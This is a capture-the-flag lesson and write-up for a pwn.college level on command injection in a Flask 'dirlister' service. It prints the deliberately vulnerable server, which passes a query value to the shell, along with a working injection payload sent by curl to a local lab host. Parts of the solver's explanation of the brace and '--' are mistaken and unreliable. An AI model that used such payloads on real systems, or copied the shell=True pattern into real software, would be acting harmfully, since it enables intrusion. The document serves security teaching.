## Exercise 
Now, imagine getting more crazy than these security issues between the web server and the file system. What about interactions between the web server and the whole Linux shell?

Depressingly often, developers rely on the command line shell to help with complex operations. In these cases, a web server will execute a Linux command and use the command's results in its operation (a frequent usecase of this, for example, is the `Imagemagick` suite of commands that facilitate image processing). Different languages have different ways to do this (the simplest way in Python is `os.system`, but we will mostly be interacting with the more advanced `subprocess.check_output`), but almost all suffer from the risk of _command injection_.

In path traversal, the attacker sent an unexpected character (`.`) that caused the filesystem to do something unexpected to the developer (look in the parent directory). The shell, similarly, is chock full of special characters that cause effects unintended by the developer, and the gap between what the developer intended and the reality of what the shell (or, in previous challenges, the file system) does holds all sorts of security issues.

For example, consider the following Python snippet that runs a shell command:

```console
os.system(f"echo Hello {word}")
```

The developer clearly intends the user to send something like `Hackers`, and the result to be something like the command `echo Hello Hackers`. But the hacker might send _anything_ the code doesn't explicitly block. Recall what you learned in the [Chaining](https://pwn.college/linux-luminarium/chaining) module of the [Linux Luminarium](https://pwn.college/linux-luminarium): what if the hacker sends something containing a `;`?

In this level, we will explore this exact concept. See if you can trick the level and leak the flag!

## Solution
Ok first things first, let's check all permissions:
```
> ls -la /
-r-------- 1 root root 60 Aug 28 19:34 /flag
drwxr-xr-x    1 root root 4096 Aug 28 19:34 challenge

> ls -la /challenge/
-rwsr-xr-x 1 root root 1801 Jan 27  2025 DESCRIPTION.md
-rwsr-xr-x 1 root root 1176 Sep  6  2025 server
```
Ok we have the permissions to read and execute the description and the server. Therefore at first let's read the description and afterwards the server source code. Ok the description is also the same as in Exercise. The server source code looks like that:
```
> cat /challenge/server
#!/usr/bin/exec-suid -- /usr/bin/python3 -I

import subprocess
import flask
import os

app = flask.Flask(__name__)


@app.route("/mission", methods=["GET"])
def challenge():
    arg = flask.request.args.get("topdir", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/mission"><input type=text name=topdir><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """


os.setuid(os.geteuid())
os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
app.secret_key = os.urandom(8)
app.config["SERVER_NAME"] = "challenge.localhost:80"
app.run("challenge.localhost", 80)
```
The server listens on /mission and waits for GET requests. It uses flask.request.args.get("topdir", "/challenge").  It seems like it takes the arguments of the query from the HTTP URL Scheme and takes arguments like that "topdir=value". Therefore we try to inject cat /flag to print our flag. But how? Well from what I can see in the line of code:
```
command = f"ls -l {arg}"
```
the bash command ls -l with the given args is executed. Therefore let's try to trick the command to take following form:
```
command = f"ls -l {}; cat /flag -- }"
```
how can we achieve that and what does the command actually do?
Well the ; seperates the commands, cat /flag prints the flag and -- sets the end of options for cat and therefore ignores the "}" character. Let's try it. First we need to take our string and need to encode space, dash and minus characters.
"}; cat /flag -- " -> "%7D%3B%20cat%20%2Fflag%20%2D%2D%20"
```
> curl -L -v "http://challenge.localhost:80/mission?topdir=%7D%3B%20cat%20%2Fflag%20%2D%2D%20"

* Host challenge.localhost:80 was resolved.
* IPv6: ::1
* IPv4: 127.0.0.1
*   Trying [::1]:80...
* connect to ::1 port 80 from ::1 port 56072 failed: Connection refused
*   Trying 127.0.0.1:80...
* Established connection to challenge.localhost (127.0.0.1 port 80) from 127.0.0.1 port 48712
* using HTTP/1.x
> GET /mission?topdir=%7D%3B%20cat%20%2Fflag%20%2D%2D%20 HTTP/1.1
> Host: challenge.localhost
> User-Agent: curl/8.21.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Werkzeug/3.0.6 Python/3.8.10
< Date: Sat, 29 Aug 2026 09:50:23 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 439
< Connection: close
<

        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/mission"><input type=text name=topdir><input type=submit value=Submit></form>
        <hr>
        <b>Output of ls -l }; cat /flag -- :</b><br>
        <pre>ls: cannot access '}': No such file or directory
pwn.college{[REDACTED FLAG]}
</pre>
        </body></html>
* shutting down connection #0
```
Well seems like it worked, but did it work like I intended? Let's take a look.
```
<pre>ls: cannot access '}': No such file or directory
pwn.college{[REDACTED FLAG]}
</pre>
```
ls throws an error because it tries to read '}', that is expected because ls -l {} reads nothing.
Afterwards our flag got printed because cat /flag was injected. And no more errors got printed because of the --.